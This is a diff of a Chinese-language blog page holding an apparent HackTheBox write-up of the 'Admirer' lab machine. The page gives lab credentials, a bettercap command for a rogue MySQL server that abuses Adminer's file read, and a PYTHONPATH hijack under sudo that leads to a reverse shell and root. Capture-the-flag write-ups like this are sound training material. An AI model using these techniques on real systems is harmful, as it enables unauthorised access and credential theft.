@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;248  10.10.10.187  端口扫描21,22,80几个端口：  80根据扫描结果，robots.txt中得到admin-dir目录，直接访问是403:  扫描目录,这里字典很重要，因为包含敏感信息的credentials.txt，一般字典里没有：  credentials.txt1">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;248  10.10.10.187  端口扫描21,22,80几个端口：                                                                                                             80">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Admirer - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2020/06/16/Admirer-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;248  10.10.10.187  端口扫描21,22,80几个端口：  80根据扫描结果，robots.txt中得到admin-dir目录，直接访问是403:  扫描目录,这里字典很重要，因为包含敏感信息的credentials.txt，一般字典里没有：  credentials.txt1">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;248  10.10.10.187  端口扫描21,22,80几个端口：                                                                                                             80">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020061601.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020061602.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020061603.jpg">
@@ -129,7 +129,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -220,15 +220,43 @@
 <li><h2 id="10-10-10-187"><a href="#10-10-10-187" class="headerlink" title="10.10.10.187"></a>10.10.10.187</h2></li>
 </ul>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>21,22,80几个端口：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020061601.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020061601.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>根据扫描结果，robots.txt中得到admin-dir目录，直接访问是403:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020061602.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020061602.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>扫描目录,这里字典很重要，因为包含敏感信息的credentials.txt，一般字典里没有：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020061603.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020061603.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="credentials-txt"><a href="#credentials-txt" class="headerlink" title="credentials.txt"></a>credentials.txt</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[Internal mail account]</span><br><span class="line">w.cooper@admirer.htb</span><br><span class="line">fgJr6q#S\W:$P</span><br><span class="line"></span><br><span class="line">[FTP account]</span><br><span class="line">ftpuser</span><br><span class="line">%n?4Wz&#125;R$tTF7</span><br><span class="line"></span><br><span class="line">[Wordpress account]</span><br><span class="line">admin</span><br><span class="line">w0rdpr3ss01!</span><br></pre></td></tr></table></figure>
 
 <h1 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h1><p>使用得到的ftp账号密码登录，发现两个文件：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020061604.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020061604.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><p>下载源码解压，index.php中得到数据库信息,但是数据库没有对外开放端口：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$servername = <span class="string">"localhost"</span>;</span><br><span class="line">$username = <span class="string">"waldo"</span>;</span><br><span class="line">$password = <span class="string">"]F7jLHw:*G&gt;UPrTo&#125;~A"</span>d6<span class="string">b";</span></span><br><span class="line"><span class="string">$dbname = "</span>admirerd<span class="string">b";</span></span><br></pre></td></tr></table></figure>
 
@@ -239,7 +267,14 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $servername = <span class="string">"localhost"</span>;</span><br><span class="line">  $username = <span class="string">"waldo"</span>;</span><br><span class="line">  $password = <span class="string">"Wh3r3_1s_w4ld0?"</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create connection</span></span><br><span class="line">  $conn = <span class="keyword">new</span> mysqli($servername, $username, $password);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check connection</span></span><br><span class="line">  <span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">"Connection failed: "</span> . $conn-&gt;connect_error);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Connected successfully"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> Finish implementing this or find a better open source alternative</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>里面包含一句提示信息，直接尝试访问 <a href="http://10.10.10.187/utility-scripts/db_admin.php" target="_blank" rel="noopener">http://10.10.10.187/utility-scripts/db_admin.php</a> 是404，说明作者找到了更好的开源方案，这里需要根据靶机名Admirer想到adminer(以前叫做phpMyAdmin)</p>
-<h1 id="adminer-php"><a href="#adminer-php" class="headerlink" title="adminer.php"></a>adminer.php</h1><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020061605.jpg" alt=""></p>
+<h1 id="adminer-php"><a href="#adminer-php" class="headerlink" title="adminer.php"></a>adminer.php</h1><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020061605.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>但使用前面得到的那些账号密码无法登录，继续查找信息，注意版本，Adminer 4.6.2,  找到相关漏洞：</p>
 <ul>
 <li>Serious Vulnerability Discovered in Adminer database Administration Tool<br><a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool" target="_blank" rel="noopener">https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool</a></li>
@@ -247,23 +282,65 @@
 <h1 id="mysql-client-文件读取"><a href="#mysql-client-文件读取" class="headerlink" title="mysql client 文件读取"></a>mysql client 文件读取</h1><p>其实就是load data lcoal infidel，我们自己做一个server，让客户端连接，读取客户端的任意文件，直接用bettercap就可以做,因为前面知道index.php中存在密码，就直接读取index.php:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bettercap -iface utun2 -eval "set mysql.server.infile ../index.php; mysql.server on"</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020061606.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020061606.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$servername = <span class="string">"localhost"</span>;</span><br><span class="line">$username = <span class="string">"waldo"</span>;</span><br><span class="line">$password = <span class="string">"&amp;&lt;h5b~yK3F#&#123;PaPB&amp;dA&#125;&#123;H&gt;"</span>;</span><br><span class="line">$dbname = <span class="string">"admirerdb"</span>;</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>这个账号密码可以ssh登录，得到user.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020061607.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020061607.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>sudo -l发现：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020061608.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020061608.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p><code>(ALL) SETENV: /opt/scripts/admin_tasks.sh</code></p>
 <p>admin_task.sh中</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">backup_web()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">"<span class="variable">$EUID</span>"</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Running backup script in the background, it might take a while..."</span></span><br><span class="line">        /opt/scripts/backup.py &amp;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Insufficient privileges to perform the selected operation."</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>这个函数调用了同目录下的backup.py文件，这个文件使用shutil中的make_archive函数，注意前面我们有SETENV权限，可以考虑做一个恶意函数，并且修改环境变量，这里Python使用的是PYTHONPATH：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020061609.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020061609.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>设置环境变量，运行，触发恶意函数：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020061610.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020061610.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>反弹shell，得到root.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020061611.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020061611.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>Serious Vulnerability Discovered in Adminer database Administration Tool<br><a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool" target="_blank" rel="noopener">https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool</a></li>
 <li><a href="https://www.bettercap.org/modules/ethernet/servers/mysql.server/" target="_blank" rel="noopener">https://www.bettercap.org/modules/ethernet/servers/mysql.server/</a></li>
